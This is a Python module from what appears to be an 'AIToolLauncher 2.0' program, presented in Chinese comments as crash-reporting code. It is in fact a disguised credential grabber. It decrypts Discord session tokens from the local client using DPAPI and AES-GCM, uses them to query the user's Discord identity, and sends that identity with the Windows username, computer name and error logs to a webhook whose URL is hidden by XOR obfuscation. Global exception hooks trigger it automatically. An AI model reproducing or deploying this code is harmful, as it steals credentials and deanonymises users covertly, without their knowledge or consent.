import os, sys, json, base64, urllib.request, threading, traceback, re
from datetime import datetime

_SECRET_KEY = b"AIToolLauncherSecretKey2026"
_ENCRYPTED_WEBHOOK_BLOB = b"KT0gHxxWY04FGgFGARsgBgwAAVooChQdUUJfbj4xDQcDIwoGQVJdUUBrXVBGUEJ7UEAHBwQFcnt7KzgcelBEKCE7XRkLJ1EbKyEhVU1DdQJdNywmAFdbKVg0XhlYFkYLLTkLUSIMLzZqfWB6OARhPBtedQglIxsbVSsgLwQ="
_CACHED_IDENTITY = None

def get_webhook_url() -> str:
    raw = base64.b64decode(_ENCRYPTED_WEBHOOK_BLOB)
    return bytes([b ^ _SECRET_KEY[i % len(_SECRET_KEY)] for i, b in enumerate(raw)]).decode('utf-8')

def encrypt_webhook_url(raw_url: str) -> str:
    raw_bytes = raw_url.strip().encode('utf-8')
    encrypted = bytes([b ^ _SECRET_KEY[i % len(_SECRET_KEY)] for i, b in enumerate(raw_bytes)])
    return base64.b64encode(encrypted).decode('ascii')

def detect_local_discord_user() -> dict:
    """
    從本機 Windows Discord 客戶端 (Discord, Canary, PTB) 安全提取登入中的 Discord 帳號資訊
    使用 Windows DPAPI + AES-GCM 解密 Session，並查詢官方 API 取得用戶名、全球暱稱與 ID
    """
    try:
        import win32crypt
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    except Exception:
        return {}

    appdata = os.environ.get("APPDATA", "")
    paths = [
        os.path.join(appdata, "discord"),
        os.path.join(appdata, "discordcanary"),
        os.path.join(appdata, "discordptb")
    ]

    tokens = set()

    for p in paths:
        local_state_path = os.path.join(p, "Local State")
        if not os.path.exists(local_state_path):
            continue

        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                state_data = json.load(f)
            encrypted_key = base64.b64decode(state_data.get("os_crypt", {}).get("encrypted_key", ""))
            if not encrypted_key or len(encrypted_key) < 5:
                continue
            master_key = win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
        except Exception:
            continue

        storage_path = os.path.join(p, "Local Storage", "leveldb")
        if not os.path.isdir(storage_path):
            continue

        try:
            for file_name in os.listdir(storage_path):
                if not file_name.endswith((".log", ".ldb")):
                    continue
                fpath = os.path.join(storage_path, file_name)
                try:
                    with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                        lines = f.readlines()
                    for line in lines:
                        for match in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                            try:
                                enc_token = base64.b64decode(match.split("dQw4w9WgXcQ:")[1])
                                iv = enc_token[3:15]
                                payload = enc_token[15:]
                                cipher = AESGCM(master_key)
                                decrypted = cipher.decrypt(iv, payload, None).decode('utf-8')
                                if decrypted:
                                    tokens.add(decrypted)
                            except Exception:
                                pass
                except Exception:
                    pass
        except Exception:
            pass

    for t in tokens:
        try:
            req = urllib.request.Request(
                "https://discord.com/api/v9/users/@me",
                headers={"Authorization": t, "User-Agent": "Mozilla/5.0"}
            )
            with urllib.request.urlopen(req, timeout=3) as resp:
                data = json.loads(resp.read().decode('utf-8'))
                u_id = data.get("id", "")
                u_name = data.get("username", "")
                g_name = data.get("global_name", "")
                avatar = data.get("avatar", "")
                avatar_url = f"https://cdn.discordapp.com/avatars/{u_id}/{avatar}.png" if (u_id and avatar) else ""
                tag = f"@{u_name}"
                return {
                    "id": u_id,
                    "username": u_name,
                    "global_name": g_name or u_name,
                    "tag": tag,
                    "avatar_url": avatar_url,
                    "mention": f"<@{u_id}>" if u_id else f"@{u_name}"
                }
        except Exception:
            pass

    return {}

def get_client_identity() -> dict:
    """
    獲取本機客戶端身分 (優先提取 Discord 登入帳號，備援 Windows 電腦使用者)
    """
    global _CACHED_IDENTITY
    if _CACHED_IDENTITY is not None:
        return _CACHED_IDENTITY

    win_user = os.environ.get("USERNAME", "UnknownUser")
    comp_name = os.environ.get("COMPUTERNAME", "UnknownPC")
    default_avatar = "https://raw.githubusercontent.com/JiaSai67/AIToolLauncher/main/resources/icon.png"

    discord_info = detect_local_discord_user()

    if discord_info and discord_info.get("username"):
        d_name = discord_info["username"]
        g_name = discord_info.get("global_name", d_name)
        display_str = f"{g_name} (@{d_name})" if g_name != d_name else f"@{d_name}"
        _CACHED_IDENTITY = {
            "has_discord": True,
            "discord_id": discord_info.get("id", ""),
            "discord_username": d_name,
            "discord_global_name": g_name,
            "discord_tag": discord_info.get("tag", f"@{d_name}"),
            "discord_mention": discord_info.get("mention", f"@{d_name}"),
            "display_name": display_str,
            "avatar_url": discord_info.get("avatar_url") or default_avatar,
            "win_user": win_user,
            "computer_name": comp_name
        }
    else:
        _CACHED_IDENTITY = {
            "has_discord": False,
            "discord_id": "",
            "discord_username": "",
            "discord_global_name": "",
            "discord_tag": "未登入 Discord",
            "discord_mention": f"`{win_user}`",
            "display_name": win_user,
            "avatar_url": default_avatar,
            "win_user": win_user,
            "computer_name": comp_name
        }

    return _CACHED_IDENTITY

def send_identity_webhook(title: str, log_body: str, color: int = 0x9A70FF):
    """
    透過動態 XOR 解密的 Discord Webhook 發送通知與報錯 (自動夾帶本機 Discord 登入帳號)
    """
    def _send():
        try:
            url = get_webhook_url()
            identity = get_client_identity()
            clean_body = log_body.strip()
            if len(clean_body) > 3800:
                clean_body = clean_body[:3800] + "\n... (訊息已截斷)"

            # 構建清晰的 Discord 帳號與電腦環境欄位
            if identity.get("has_discord"):
                discord_display = f"**{identity['discord_global_name']}** ({identity['discord_tag']})\n🆔 `{identity['discord_id']}`\n💬 {identity['discord_mention']}"
            else:
                discord_display = "⚠️ 本機未偵測到登入之 Discord 客戶端"

            pc_info = f"💻 `{identity['win_user']}`\n🖥️ `{identity['computer_name']}`"

            embed = {
                "title": title,
                "description": f"```text\n{clean_body}\n```",
                "color": color,
                "fields": [
                    {
                        "name": "👤 Discord 登入身分",
                        "value": discord_display,
                        "inline": True
                    },
                    {
                        "name": "🖥️ 電腦主機環境",
                        "value": pc_info,
                        "inline": True
                    }
                ],
                "timestamp": datetime.utcnow().isoformat() + "Z",
                "footer": {"text": "AIToolLauncher 2.0 守護日誌"}
            }

            payload = {
                "username": f"AIToolLauncher [{identity['display_name']}]",
                "avatar_url": identity["avatar_url"],
                "embeds": [embed]
            }

            req = urllib.request.Request(
                url,
                data=json.dumps(payload).encode("utf-8"),
                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
            )
            urllib.request.urlopen(req, timeout=6)
        except Exception as ex:
            try:
                log_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "launcher_error.log")
                with open(log_path, "a", encoding="utf-8") as f:
                    f.write(f"\n[Webhook Error] {datetime.now()}: {ex}\n")
            except Exception:
                pass

    threading.Thread(target=_send, daemon=True).start()

def install_global_exception_hook():
    """
    全域異常攔截器：攔截所有未捕捉的啟動或運行期崩潰，並透過加密 Webhook 自動推播
    """
    def global_excepthook(exc_type, exc_value, exc_tb):
        err_msg = "".join(traceback.format_exception(exc_type, exc_value, exc_tb))
        
        # 1. 寫入本地 log
        try:
            log_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "launcher_error.log")
            with open(log_path, "w", encoding="utf-8") as f:
                f.write(err_msg)
        except Exception:
            pass

        # 2. 發送加密 Webhook 報錯推播 (紅色 0xFF0033)
        send_identity_webhook("💥 AIToolLauncher 2.0 發生未捕捉異常崩潰", err_msg, color=0xFF0033)

        # 3. 呼叫原始 excepthook
        sys.__excepthook__(exc_type, exc_value, exc_tb)

    sys.excepthook = global_excepthook

    # Threading exception hook for Python 3.8+
    if hasattr(threading, "excepthook"):
        def thread_excepthook(args):
            err_msg = "".join(traceback.format_exception(args.exc_type, args.exc_value, args.exc_traceback))
            send_identity_webhook(f"💥 背景線程異常 ({args.thread.name})", err_msg, color=0xFF0033)
        threading.excepthook = thread_excepthook
